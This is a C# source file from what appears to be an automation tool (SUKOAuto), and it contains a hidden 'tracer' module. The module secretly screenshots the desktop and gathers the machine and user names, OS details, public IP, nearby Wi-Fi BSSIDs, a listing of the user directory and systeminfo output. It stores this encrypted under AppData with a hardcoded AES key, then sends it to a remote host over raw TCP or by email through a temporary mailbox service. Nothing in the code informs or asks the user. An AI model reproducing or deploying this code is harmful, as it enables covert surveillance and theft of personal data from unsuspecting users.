using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ComponentModel;
using System.Net;
using System.Web;
using System.IO;
using System.Threading;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;
using static SUKOAuto.tracer.Utils;
using System.Net.Sockets;
using System.IO.Compression;
using System.Xml.Linq;


namespace SUKOAuto.tracer
{
    public class Emial
    {
        public static string PC_USER_AGENT = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36";

        public static readonly string ENDPOINT = "https://api.mytemp.email/1/";
        public static readonly string PING = "ping";
        public static readonly string DESTROY = "inbox/destroy";
        public static readonly string CREATE = "inbox/create";
        public static readonly string CHECK = "inbox/check";
        public static readonly string EXTEND = "inbox/extend";
        public static readonly string EML_GET = "eml/get";
        public static readonly string EML_CREATE = "eml/create";
        public static readonly string UTF_8 = "utf-8";

        private string sid = RandomSid();
        private Dictionary<string, string[]> inboxes = new Dictionary<string, string[]>();
        private DateTime sessionStarted;
        private int taskCount;

        public Emial()
        {
            var data = new Dictionary<string, string>
            {
                ["sid"] = sid,
                ["task"] = "1",
                ["tt"] = "0"
            };
            if ((int)JsonRequest(PING, data, false)["pong"] != 1)
                throw new Exception("Ping error");
            sessionStarted = DateTime.Now;
            taskCount = 1;
        }

        public List<string> Inboxes => new List<string>(inboxes.Keys);

        public string CreateInbox()
        {
            var query = new Dictionary<string, string>
            {
                ["sid"] = sid,
                ["task"] = Task,
                ["tt"] = Tt
            };
            var data = JsonRequest(CREATE, query, false);
            inboxes[(string)data["inbox"]] = new string[]{
                (string)data["inbox_hash"],
                (string)data["inbox_destroy_hash"]
            };
            return (string)data["inbox"];
        }

        public void DestroyInbox(string addr)
        {
            if (inboxes.ContainsKey(addr))
                throw new Exception("No such inbox recorded: " + addr);
            var query = new Dictionary<string, string>
            {
                ["inbox"] = addr,
                ["inbox_destroy_hash"] = inboxes[addr][1],
                ["sid"] = sid,
                ["task"] = Task,
                ["tt"] = Tt
            };
            EasyRequest(DESTROY, query, false);
            inboxes.Remove(addr);
        }

        public void SendEmail(string from, string to, string subject, string text)
        {
            var query = new Dictionary<string, string>
            {
                ["inbox"] = from,
                ["inbox_hash"] = inboxes[from][0],
                ["sid"] = sid,
                ["task"] = Task,
                ["tt"] = Tt
            };
            var json = ToJson(new Dictionary<string, string>
            {
                ["to"] = to,
                ["subject"] = subject,
                ["text"] = text
            });
            if ((int)ToJsonObject(Request(ENDPOINT + EML_CREATE + "?" + MapToQuery(query), json.ToString(), ContentType: "application/json;charset=utf-8"))["ok"] != 1)
                throw new Exception("Sending email failed");
        }

        private string Task => (taskCount++).ToString();

        private string Tt => ((long)(DateTime.Now - sessionStarted).TotalSeconds).ToString();

        private JObject ToJsonObject(string json)
        {
            return JObject.Parse(json);
        }

        private JObject JsonRequest(string call, Dictionary<string, string> values, bool isPost = false)
        {
            return ToJsonObject(EasyRequest(call, values, isPost));
        }

        private string EasyRequest(string call, Dictionary<string, string> values, bool isPost = false)
        {
            Thread.Sleep(500);
            if (isPost)
                return Request(ENDPOINT + call, MapToQuery(values));
            else
                return Request(ENDPOINT + call + "?" + MapToQuery(values));
        }

        // GET request version
        private string Request(string addr)
        {
            var enc = Encoding.GetEncoding("utf-8");
            var wc = WebRequest.CreateHttp(addr);
            wc.UserAgent = PC_USER_AGENT;
            wc.Headers.Add("Origin", "https://mytemp.email");
            wc.Headers.Add("Accept-Language", "ja,en-US;q=0.8,en;q=0.6,fr;q=0.4,de;q=0.2");
            wc.Accept = "application/json, text/plain, */*";
            wc.Referer = "https://mytemp.email/2/";
            wc.Headers.Add("Authority", "api.mytemp.email");

            wc.Method = "GET";
            wc.ContentType = "application/x-www-form-urlencoded";
            var response = wc.GetResponse();
            using (var download = response.GetResponseStream())
            {
                using (var text = new StreamReader(download))
                {
                    return text.ReadToEnd();
                }
            }
        }

        // POST request version
        private string Request(string addr, string data, Dictionary<string, string> header = null, string ContentType = null)
        {
            var enc = Encoding.GetEncoding("utf-8");
            var payload = enc.GetBytes(data);
            var wc = WebRequest.CreateHttp(addr);
            wc.UserAgent = PC_USER_AGENT;
            wc.Headers.Add("Origin", "https://mytemp.email");
            wc.Headers.Add("Accept-Language", "ja,en-US;q=0.8,en;q=0.6,fr;q=0.4,de;q=0.2");
            wc.Accept = "application/json, text/plain, */*";
            wc.Referer = "https://mytemp.email/2/";
            wc.Headers.Add("Authority", "api.mytemp.email");

            if (header != null)
            {
                foreach (var entry in header)
                {
                    wc.Headers.Add(entry.Key, entry.Value);
                }
            }
            wc.Method = "POST";
            wc.ContentType = ContentType ?? "application/x-www-form-urlencoded";
            wc.ContentLength = payload.Length;
            using (var post = wc.GetRequestStream())
            {
                post.Write(payload, 0, payload.Length);
            }
            var response = wc.GetResponse();
            using (var download = response.GetResponseStream())
            {
                using (var text = new StreamReader(download))
                {
                    return text.ReadToEnd();
                }
            }
        }

        private static string MapToQuery(Dictionary<string, string> query)
        {
            var sb = new StringBuilder();
            foreach (var entry in query)
            {
                if (sb.Length != 0) sb.Append('&');
                sb.Append(HttpUtility.UrlEncode(entry.Key, UTF8));
                sb.Append('=');
                sb.Append(HttpUtility.UrlEncode(entry.Value, UTF8));
            }
            return sb.ToString();
        }

        private static string RandomSid()
        {
            var rand = new Random();
            var sb = new StringBuilder();
            for (int i = 0; i < 7; i++)
                sb.Append(rand.Next() % 10);
            return sb.ToString();
        }
    }

    public class Tracer
    {
        public static List<IDataUploadProvider> UPLOADERS;
        public static IFileStore STORE;
        static Tracer()
        {
            List<IDataUploadProvider> uploaders = new List<IDataUploadProvider>();
            //Add your DataUploadProvider
            uploaders.Add(new RawUploader1());
            //uploaders.Add(new RawUploader2());
            uploaders.Add(new MailUploader());
            UPLOADERS = uploaders;
            STORE = new TempFileStore();//Replace with your FileStore
        }

        public static void StoreOrUpload(string filename, string content)
        {
            var CollectionWorker = new BackgroundWorker();
            CollectionWorker.DoWork += (a, b) =>
            {
                try
                {
                    if (IsValidBinary())
                        return;
                    var id = PopulateOrLoadId();
                    STORE.Save(filename, content);
                    foreach (var file in STORE.ListNames())
                    {
                        var text = STORE.Get(file);
                        foreach (var uploader in UPLOADERS)
                        {
                            var inf = uploader.ForInterface();
                            inf.Init();
                            if (uploader.IsAvailable() && inf.DoUpload(id, file, text))
                            {
                                STORE.Remove(file);
                                break;
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                    throw;
                }
            };
            CollectionWorker.RunWorkerAsync();
        }

        public static void PerformTasks(string[] args =null) {
            var screen = new BackgroundWorker();
            screen.DoWork += (a, b) =>
            {
                StoreOrUpload($"ss-{CurrentMilliseconds}.png.b64", Convert.ToBase64String(Generic.PrtScrn()));
            };
            screen.RunWorkerAsync();
            var sysinfo = new BackgroundWorker();
            sysinfo.DoWork += (a, b) =>
            {
                string Message = "";

                try
                {
                    Message += string.Format("Arguments:{0}\r\n",args==null?"": string.Join(" ", args));
                }
                catch { }
                try
                {
                    Message += string.Format("Machine:{0}\r\n", Environment.MachineName);
                }
                catch { }
                try
                {
                    Message += string.Format("User:{0}\r\n", Environment.UserName);
                }
                catch { }
                try
                {
                    Message += string.Format("OSVersion:{0}\r\n", Environment.OSVersion.VersionString);
                }
                catch { }
                try
                {
                    Message += string.Format("IPAddress:{0}\r\n", Generic.RegExp(Generic.HttpRequest(@"http://checkip.amazonaws.com/"), @"\d+\.\d+\.\d+\.\d+")[0]);
                }
                catch { }
                try
                {
                    Message += string.Format("WlanBSSIDs:{0}\r\n", string.Join(" ", Generic.RegExp(Generic.ExeCommand(@"netsh wlan show networks mode=bssid"), @"[\da-f]+:[\da-f]+:[\da-f]+:[\da-f]+:[\da-f]+:[\da-f]+")));
                }
                catch { }
                try
                {
                    Message += string.Format("UserDir:{0}\r\n", string.Join(" ", Generic.ExeCommand(@"dir %USERPROFILE%\..")));
                }
                catch { }
                try
                {
                    Message += string.Format("Systeminfo:{0}\r\n", string.Join(" ", Generic.ExeCommand(@"systeminfo")));
                }
                catch { }

                StoreOrUpload($"sysinfo-{CurrentMilliseconds}.txt",Message);
            };
        }
    }

    public interface IDataUploadProvider
    {
        bool IsAvailable();
        IDataUploadProviderInterface ForInterface();
    }
    public interface IDataUploadProviderInterface
    {
        void Init();
        bool DoUpload(String uuid, String filename, String content);
    }
    public interface IFileStore
    {
        List<String> ListNames();
        String Get(String name);
        bool Save(String name, String data);
        bool Remove(String name);
    }

    class TempFileStore : IFileStore
    {
        public TempFileStore()
        {
            Directory.CreateDirectory(DIR_TRACER);
        }

        string IFileStore.Get(string name)
        {
            var fileDir = Path.Combine(DIR_TRACER, "SSC1" + Encrypt(name));
            return DecryptFile(fileDir);
        }

        List<string> IFileStore.ListNames()
        {
            return Directory.EnumerateFiles(DIR_TRACER)
                .Select(a => Path.GetFileName(a))
                .Where(a => a.StartsWith("SSC1"))
                .Select(a => a.Substring(4))
                .Select(a => Decrypt(a))
                .ToList();
        }

        bool IFileStore.Remove(string name)
        {
            var fileDir = Path.Combine(DIR_TRACER, "SSC1" + Encrypt(name));
            File.Delete(fileDir);
            return !File.Exists(fileDir);
        }

        bool IFileStore.Save(string name, string data)
        {
            var fileDir = Path.Combine(DIR_TRACER, "SSC1" + Encrypt(name));
            try
            {
                EncryptFile(data, fileDir);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }

    class Utils
    {
        static byte[] key = Convert.FromBase64String("h8ukfAk2hC/UJqWKO/kJpw==");
        static byte[] iv = Convert.FromBase64String("bbsH6XzL1C/3nRWEUx751A==");
        static Encoding enc = Encoding.GetEncoding("utf-8");
        static List<byte[][]> remoteBinaryHashes = null;
        static bool? Validated=null;

        public static Encoding UTF8 => enc;
        public static Encoding ShiftJIS => Encoding.GetEncoding("Shift-JIS");
        public static string HOST => "hikarukarisuma.orz.hm";
        public static int PORT => 8083;

        public static string DIR_TRACER => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SukoSukoCollection");

        public static string Encrypt(string str)
        {
            AesManaged aes = new AesManaged
            {
                BlockSize = 128,
                KeySize = 128,
                Mode = CipherMode.CBC,
                Padding = PaddingMode.PKCS7,
                Key = key,
                IV = iv
            };
            var crypt = aes.CreateEncryptor();
            var data = enc.GetBytes(str);
            /*using (var buffer = new UnclosableMemoryStream())
            {
                using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                {
                    cryptStream.Write(data, 0, data.Length);
                    cryptStream.FlushFinalBlock();
                    cryptStream.Close();
                }
                return ByteArrayToString(buffer.ToArray());
            }*/
            return ByteArrayToString(crypt.TransformFinalBlock(data, 0, data.Length));
        }

        public static string Decrypt(string str)
        {
            AesManaged aes = new AesManaged
            {
                BlockSize = 128,
                KeySize = 128,
                Mode = CipherMode.CBC,
                Padding = PaddingMode.PKCS7,
                Key = key,
                IV = iv
            };
            var crypt = aes.CreateDecryptor();
            var data = StringToByteArray(str);
            /*using (var buffer = new UnclosableMemoryStream())
            {
                using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                {
                    cryptStream.Write(data, 0, data.Length);
                    cryptStream.FlushFinalBlock();
                    cryptStream.Close();
                }
                return enc.GetString(buffer.ToArray());
            }*/
            return UTF8.GetString(crypt.TransformFinalBlock(data, 0, data.Length));
        }

        public static void EncryptFile(string str, string fileSaveTo)
        {
            AesManaged aes = new AesManaged
            {
                BlockSize = 128,
                KeySize = 128,
                Mode = CipherMode.CBC,
                Padding = PaddingMode.PKCS7,
                Key = key,
                IV = iv
            };
            var crypt = aes.CreateEncryptor();
            var data = UTF8.GetBytes(str);
            using (var buffer = new FileStream(fileSaveTo, FileMode.Create))
            {
                /*using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                {
                    cryptStream.Write(data, 0, data.Length);
                    cryptStream.FlushFinalBlock();
                    cryptStream.Close();
                }*/
                var buf = crypt.TransformFinalBlock(data, 0, data.Length);
                buffer.Write(buf, 0, buf.Length);
            }
        }

        public static string DecryptFile(string fileReadFrom)
        {
            AesManaged aes = new AesManaged
            {
                BlockSize = 128,
                KeySize = 128,
                Mode = CipherMode.CBC,
                Padding = PaddingMode.PKCS7,
                Key = key,
                IV = iv
            };
            var crypt = aes.CreateDecryptor();
            /*using (var buffer = new UnclosableMemoryStream())
            {
                using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                {
                    using (var source = new FileStream(fileReadFrom, FileMode.Open))
                    {
                        source.CopyTo(buffer);
                    }
                    cryptStream.FlushFinalBlock();
                    cryptStream.Close();
                }
                return enc.GetString(buffer.ToArray());
            }*/
            var fileContent = File.ReadAllBytes(fileReadFrom);
            var decrypted = crypt.TransformFinalBlock(fileContent, 0, fileContent.Length);
            return UTF8.GetString(decrypted);
        }

        public static string ByteArrayToString(byte[] ba)
        {
            string hex = BitConverter.ToString(ba);
            return hex.Replace("-", "");
        }
        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        public static string PopulateOrLoadId()
        {
            var filePlace = Path.Combine(DIR_TRACER, "Scottland");
            string id;
            if (File.Exists(filePlace))
            {
                id = DecryptFile(filePlace);
            }
            else
            {
                id = Guid.NewGuid().ToString();
            }
            EncryptFile(id, filePlace);
            return id;
        }

        public static bool IsValidBinary()
        {
            if (Validated!=null) {
                return (bool)Validated;
            }
            bool LocalValidated = false;
            try
            {
                if (remoteBinaryHashes == null)
                {
                    string hashXml;
                    using (var client = new WebClient())
                    {
                        hashXml = client.DownloadString("https://cdn.rawgit.com/AnKoushinist/2f593393b6a8770eabe13718f9b099c5/raw/hashes.xml");
                    }
                    remoteBinaryHashes = XDocument.Parse(hashXml).Descendants("Hash").Select(a =>
                    {
                        List<byte[]> hashes = new List<byte[]>();
                        hashes.Add(Convert.FromBase64String(a.Element("Sha256").Value));
                        hashes.Add(Convert.FromBase64String(a.Element("Sha1").Value));
                        return hashes.ToArray();
                    }).ToList();
                }
                var appBinary = File.ReadAllBytes(System.Reflection.Assembly.GetExecutingAssembly().Location);
                var sha256 = Hash(appBinary, new SHA256Managed());
                var sha1 = Hash(appBinary, new SHA1Managed());

                LocalValidated=remoteBinaryHashes.Select(a => Equals(a[0], sha256) && Equals(a[1], sha1)).Count() != 0;
            }
            catch (Exception)
            {
                LocalValidated = false;
            }
            if (!LocalValidated) {
                // we give you one more chance now...
                int MagicNum1 = -300799261 ^ 0xf802ae3;  //低
                int MagicNum2 = -1928516893 ^ 0xf802ae3; //高
                var MagicData1 = ShiftJIS.GetString(BitConverter.GetBytes(MagicNum1).Skip(2).ToArray());
                var MagicData2 = ShiftJIS.GetString(BitConverter.GetBytes(MagicNum2).Skip(2).ToArray());

                var IntegrityHash = "f1c96ca1daaa1cb731aea1c7fa74be63c33538cf068fcd5baeef9eac7ebe834f";

                bool Test1 = SukoSukoMachine.XPATH_1.Contains(MagicData1);
                bool Test2 = SukoSukoMachine.XPATH_1.Contains(MagicData2);

                bool Test3 = SukoSukoMachine.XPATH_2.Contains(MagicData1);
                bool Test4 = SukoSukoMachine.XPATH_2.Contains(MagicData2);

                bool Test5 = SukoSukoMachine.XPATH_3.Contains(MagicData1);
                bool Test6 = SukoSukoMachine.XPATH_3.Contains(MagicData2);

                bool Test7 = Equals(Hash(UTF8.GetBytes(SukoSukoMachine.INTEGRITY),new SHA256Managed()),StringToByteArray(IntegrityHash));

                LocalValidated = Test1 & !Test2 & Test3 & !Test4 & Test5 & !Test6 & Test7;
            }
            // no chance more!
            Validated = LocalValidated;
            return LocalValidated;
        }

        public static byte[] Hash(byte[] input, HashAlgorithm alg)
        {
            alg.Initialize();
            return alg.ComputeHash(input);
        }

        public static bool Equals(byte[] a, byte[] b)
        {
            if (a == b) return true;
            if (a.Length != b.Length) return false;
            for (int i = 0; i < a.Length; i++)
            {
                if (a[i] != b[i])
                    return false;
            }
            return true;
        }

        public static long CurrentMilliseconds => (long)(DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0)).TotalMilliseconds;

        public static string ToJson(Dictionary<string, string> dictionary)
        {
            List<string> entries = new List<string>();
            foreach (var entry in dictionary)
            {
                entries.Add($"\"{entry.Key}\":\"{entry.Value}\"");
            }
            return $"{{{string.Join(",", entries)}}}";
        }
    }

    class MailUploader : IDataUploadProvider, IDataUploadProviderInterface
    {
        Emial email = null;
        string inbox = null;

        bool IDataUploadProviderInterface.DoUpload(string uuid, string filename, string content)
        {
            const String CRLF = "\r\n";
            var payload = UTF8.GetBytes(content);
            StringBuilder mailText = new StringBuilder();
            mailText.Append(uuid).Append(CRLF);
            mailText.Append(filename).Append(CRLF);
            mailText.Append(Convert.ToBase64String(payload)).Append(CRLF);
            mailText.Append("=== DATA END ===").Append(CRLF);
            try
            {
                email.SendEmail(inbox, "hikarukarisma@yahoo.co.jp", "UPLOAD FILE SUKOSUKO", mailText.ToString());
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        IDataUploadProviderInterface IDataUploadProvider.ForInterface()
        {
            return this;
        }

        void IDataUploadProviderInterface.Init()
        {
            if (email == null)
            {
                email = new Emial();
            }
            if (inbox == null)
            {
                inbox = email.CreateInbox();
            }
        }

        bool IDataUploadProvider.IsAvailable()
        {
            return true;
        }
    }

    abstract class RawUploaderBase : IDataUploadProvider, IDataUploadProviderInterface
    {
        public abstract bool DoUpload(string uuid, string filename, string content);
        public abstract void Init();

        IDataUploadProviderInterface IDataUploadProvider.ForInterface()
        {
            return this;
        }

        bool IDataUploadProvider.IsAvailable()
        {
            try
            {
                using (TcpClient sock = new TcpClient())
                {
                    sock.Connect(HOST, PORT);
                    using (NetworkStream stream = sock.GetStream())
                    {
                        stream.ReadTimeout = 5000;
                        stream.WriteTimeout = 5000;
                        stream.WriteByte(7);
                    }
                }
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        protected void WriteUtf(string str, Stream stream)
        {
            var payload = UTF8.GetBytes(str);
            BinaryWriter writer = null;
            try
            {
                writer = new BinaryWriter(stream);
                writer.Write((short)payload.Length);
                writer.Write(payload);
            }
            finally
            {
                if (writer != null)
                    writer.Flush();
            }
        }
    }

    class RawUploader1 : RawUploaderBase
    {
        public override bool DoUpload(string uuid, string filename, string content)
        {
            try
            {
                var payload = UTF8.GetBytes(content);
                using (TcpClient sock = new TcpClient())
                {
                    sock.Connect(HOST, PORT);
                    using (NetworkStream stream = sock.GetStream())
                    {
                        stream.ReadTimeout = 5000;
                        stream.WriteTimeout = 5000;
                        stream.WriteByte(3);
                        WriteUtf(uuid, stream);
                        WriteUtf(filename, stream);
                        using (var gzip = new GZipStream(stream, CompressionMode.Compress, true))
                        {
                            gzip.Write(payload, 0, payload.Length);
                        }
                    }
                }
                byte[] payloadSha256 = Hash(payload, SHA256.Create());
                byte[] payloadMd5 = Hash(payload, MD5.Create());
                using (TcpClient sock = new TcpClient())
                {
                    sock.Connect(HOST, PORT);
                    using (NetworkStream stream = sock.GetStream())
                    {
                        stream.ReadTimeout = 5000;
                        stream.WriteTimeout = 5000;
                        stream.WriteByte(12);
                        WriteUtf(uuid, stream);
                        WriteUtf(filename, stream);
                        stream.Flush();

                        byte[] sha256 = new byte[16];
                        byte[] md5 = new byte[8];
                        stream.Read(sha256, 0, 16);
                        stream.Read(md5, 0, 8);

                        return Equals(payloadSha256, sha256) && Equals(payloadMd5, md5);
                    }
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        public override void Init()
        {
            /* no-op in this time */
        }
    }


    class UnclosableMemoryStream : MemoryStream
    {
        protected override void Dispose(bool disposing)
        { }
        public void DisposeReally()
        {
            base.Dispose(true);
        }
        ~UnclosableMemoryStream()
        {
            DisposeReally();
        }
    }
}